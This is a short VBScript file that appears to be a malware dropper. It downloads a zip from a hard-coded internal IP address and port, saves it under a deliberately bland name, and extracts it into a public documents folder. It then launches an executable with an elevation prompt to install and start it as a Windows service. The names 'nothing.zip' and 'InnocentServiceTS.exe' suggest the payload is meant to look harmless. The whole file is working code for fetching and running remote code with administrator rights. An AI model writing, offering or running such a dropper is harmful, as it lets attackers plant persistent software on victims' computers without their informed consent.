
'downloading the service zip
Set xHttp = CreateObject("Microsoft.XMLHTTP")
Set bStream = CreateObject("Adodb.Stream")
xHttp.Open "GET", "http://10.0.0.90:35813", False
xHttp.Send

'saving the zip file
with bStream
	.type = 1 'binary text
	.open
	.write xHttp.responseBody
	.savetofile "C:\Users\Public\Documents\nothing.zip", 2 'overwrite file
end with

'making a new directory
Set FSO = CreateObject("Scripting.FileSystemObject")
Dim Counter :  Counter = 1
While FSO.FolderExists("C:\Users\Public\Documents\RoomService" & Counter &"\")
	Counter = Counter + 1
Wend
Dim PATH : PATH = "C:\Users\Public\Documents\RoomService" & Counter & "\"
FSO.CreateFolder PATH

'unzipping to dir
Set shell = CreateObject("Shell.Application")
Set src = shell.NameSpace("C:\Users\Public\Documents\nothing.zip").Items()
shell.NameSpace(PATH).CopyHere src, 256

MsgBox(PATH & "InnocentServiceTS.exe install start")
'installing the service
shell.ShellExecute "cmd.exe", "/c " & PATH & "InnocentServiceTS.exe install start", "", "runas", 1
